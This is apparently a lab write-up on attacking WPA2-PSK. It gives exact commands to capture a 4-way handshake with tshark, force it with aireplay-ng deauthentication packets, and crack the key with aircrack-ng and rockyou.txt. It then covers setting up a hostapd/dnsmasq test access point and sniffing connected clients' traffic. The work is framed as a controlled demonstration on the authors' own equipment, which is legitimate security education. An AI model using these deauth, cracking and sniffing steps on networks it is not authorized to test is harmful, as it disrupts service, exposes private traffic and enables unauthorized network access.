## Capturing the 4-Way Handshake on Linux Using tshark

To perform a practical demonstration of WiFi security weaknesses, the first step was to capture a WPA2 4-way handshake. This requires a Linux machine (e.g., Kali Linux or Ubuntu) with a wireless network interface card (NIC) that supports **monitor mode**. Below are the exact steps we followed.

### 1. Verify Wireless Interface and Monitor Mode Support
```bash
# Identify your wireless interface (usually wlan0)
iw dev
# or
iwconfig

# Check supported modes (look for "monitor")
iw list | grep -A 10 "Supported interface modes"
```
- If `monitor` is **not** listed, you will need a compatible USB WiFi adapter (e.g., one based on Atheros AR9271 or Ralink RT3070 chipsets). Built-in laptop cards often do not support it.

### 2. Put the Interface into Monitor Mode
We used the `aircrack-ng` suite (recommended for reliability):
```bash
sudo apt update && sudo apt install aircrack-ng tshark -y

sudo airmon-ng check kill          # Kill interfering processes (NetworkManager, etc.)
sudo airmon-ng start wlan0         # Creates mon0 (or wlan0mon)
```
Manual alternative (if airmon-ng is unavailable):
```bash
sudo ip link set wlan0 down
sudo iw wlan0 set monitor none
sudo ip link set wlan0 up
```

### 3. Set the Correct Channel
The interface **must** be locked to the target AP's channel (critical for capturing the handshake):
```bash
# Example: AP is on channel 11
sudo iw dev mon0 set channel 11
```
(You can discover the channel beforehand with `sudo airodump-ng mon0` or `iwlist wlan0 scan` before enabling monitor mode.)

### 4. Listen and Record the 4-Way Handshake with tshark
```bash
# Targeted capture: EAPOL (4-way handshake) + traffic to/from the AP BSSID
sudo tshark -i mon0 -w pcap.pcap -f "wlan addr 9C:A2:F4:28:E8:AB or eapol"
```
- **To force the handshake** (most networks are idle): Open a second terminal and deauthenticate a connected client:
  ```bash
  sudo aireplay-ng -0 10 -a 9C:A2:F4:28:E8:AB mon0   # Send 10 deauth packets
  ```
- Watch the tshark terminal (or stop with Ctrl+C once you see the 4 EAPOL messages in a follow-up Wireshark analysis). The file `pcap.pcap` now contains the handshake.

## Cracking the Handshake with Aircrack-ng (Dictionary Attack)

Once the handshake was captured, we cracked it using a dictionary attack. The exact command we ran was:

```bash
aircrack-ng -a 2 -b 9C:A2:F4:28:E8:AB -w real_password.txt pcap.pcap
```

**Command breakdown:**
- `-a 2` → WPA/WPA2-PSK attack mode
- `-b 9C:A2:F4:28:E8:AB` → Target AP BSSID
- `-w real_password.txt` → Wordlist file

We created `real_password.txt` as a small curated list but also demonstrated the attack using the classic `rockyou.txt` wordlist (14+ million common passwords). Because the password we set on our test access point was a **common word** that appears in rockyou.txt, aircrack-ng quickly found the match and output the cracked key.

**Demo result:**  
The attack completed in seconds on our lab hardware, proving that weak/common passwords make WPA2-PSK networks trivially crackable once the handshake is captured. This was a controlled educational demonstration on our own AP only.

## Configuring the Test Access Point with hostapd and dnsmasq

For the access point portion of the lab, the working setup used `hostapd` for the wireless AP, `dnsmasq` for DHCP, `iptables` for NAT, and Linux IP forwarding for routing. The NetworkManager hotspot method brought the interface up, but clients did not receive usable network configuration. The issue was DHCP, not WiFi association.

### 1. Confirm Interfaces and Route
```bash
nmcli device
ip route
```
- `wlp2s0` was the wireless AP interface.
- `enp1s0` was the upstream internet interface.
- `tun0` and `wg0` were present, but not used as the default route.

### 2. Install Tools and Assign the AP Address
```bash
sudo apt update
sudo apt install hostapd dnsmasq iptables-persistent

sudo ip addr flush dev wlp2s0
sudo ip addr add 10.42.0.1/24 dev wlp2s0
sudo ip link set wlp2s0 up
```
This makes the mini PC the gateway for clients on `10.42.0.0/24`.

### 3. Configure hostapd
`/etc/hostapd/hostapd.conf`:
```ini
interface=wlp2s0
driver=nl80211
ssid=TPLink_28
hw_mode=g
channel=6

auth_algs=1
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

`/etc/default/hostapd`:
```ini
DAEMON_CONF="/etc/hostapd/hostapd.conf"
```

```bash
sudo systemctl unmask hostapd
sudo systemctl enable hostapd
```

Hostapd logs showed that clients could authenticate, associate, and complete the WPA handshake.

### 4. Configure dnsmasq for DHCP
`/etc/dnsmasq.conf`:
```ini
interface=wlp2s0
bind-interfaces
except-interface=lo
port=0

dhcp-range=10.42.0.10,10.42.0.100,12h
dhcp-option=3,10.42.0.1
dhcp-option=6,8.8.8.8,8.8.4.4

log-dhcp
log-queries
```
- `bind-interfaces` keeps DHCP bound to `wlp2s0`.
- `port=0` disables the `dnsmasq` DNS listener and avoids port 53 conflicts.
- DHCP option `3` sets `10.42.0.1` as the client gateway.
- DHCP option `6` provides DNS resolvers.

The client join issue was fixed once `dnsmasq` was correctly serving DHCP on the AP network.

### 5. Prevent NetworkManager from Managing the AP Interface
In `/etc/NetworkManager/NetworkManager.conf`:
```ini
[keyfile]
unmanaged-devices=interface-name:wlp2s0
```

```bash
sudo systemctl restart NetworkManager
```

### 6. Enable Forwarding and NAT
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

For persistence, add this to `/etc/sysctl.conf`:
```ini
net.ipv4.ip_forward=1
```

```bash
sudo sysctl -p
sudo iptables -t nat -A POSTROUTING -o enp1s0 -j MASQUERADE
sudo iptables -A FORWARD -i wlp2s0 -o enp1s0 -j ACCEPT
sudo iptables -A FORWARD -i enp1s0 -o wlp2s0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo netfilter-persistent save
```

### 7. Useful Validation Commands
```bash
sudo systemctl status hostapd
journalctl -u hostapd -f

sudo systemctl status dnsmasq
journalctl -u dnsmasq -f

ip a | grep 10.42
sudo tcpdump -n -i wlp2s0 'port 67 or port 68'
sudo cat /var/lib/misc/dnsmasq.leases

ip route
sudo iptables -t nat -L -n -v
sudo iptables -L FORWARD -n -v
```

Repeated DHCP requests without DHCP offers meant the client was reaching the AP, but DHCP was not replying.

## Monitoring Connected Clients and Traffic

After the AP, DHCP, and NAT rules were working, traffic could be monitored from `wlp2s0`. These checks were used only on authorized lab devices connected to the test network.

### 1. Identify Connected Clients
```bash
sudo iw dev wlp2s0 station dump
sudo cat /var/lib/misc/dnsmasq.leases
ip neigh
```
- `station dump` shows associated client MACs, signal strength, bitrate, packets, and bytes.
- `dnsmasq.leases` shows assigned IPs, MACs, and hostnames when available.
- `ip neigh` shows active local neighbors.

Optional vendor lookup:
```bash
sudo apt install ieee-data
grep -i "ee:d6:17" /usr/share/ieee-data/oui.txt
```

### 2. Monitor Bandwidth
```bash
sudo apt install iftop nload
sudo iftop -i wlp2s0
sudo nload wlp2s0
```
`iftop` is useful for per-client traffic. `nload` is useful for an interface-level view.

### 3. Capture Packets
```bash
sudo tcpdump -n -i wlp2s0
sudo tcpdump -n -i wlp2s0 host 10.42.0.12
sudo tcpdump -n -i wlp2s0 port 53
sudo tcpdump -n -i wlp2s0 port 80
```
- Port 53 shows DNS traffic when clients use plaintext DNS.
- Port 80 shows HTTP traffic, but most modern web traffic uses HTTPS.

### 4. Use Wireshark for Visual Analysis
```bash
sudo apt install wireshark
sudo wireshark
```
Capture on `wlp2s0` to inspect DNS queries, TLS handshakes, destination IPs, protocols, and traffic volume.

### 5. Visibility Limits
From this setup, we can see connected devices, assigned IPs, MAC addresses, hostnames when available, plaintext DNS queries, destination IPs, protocols, and traffic volume.

We cannot see passwords, private messages, or HTTPS page contents from packet capture alone. Most application traffic is encrypted with TLS, so payload contents are not readable without additional interception steps.
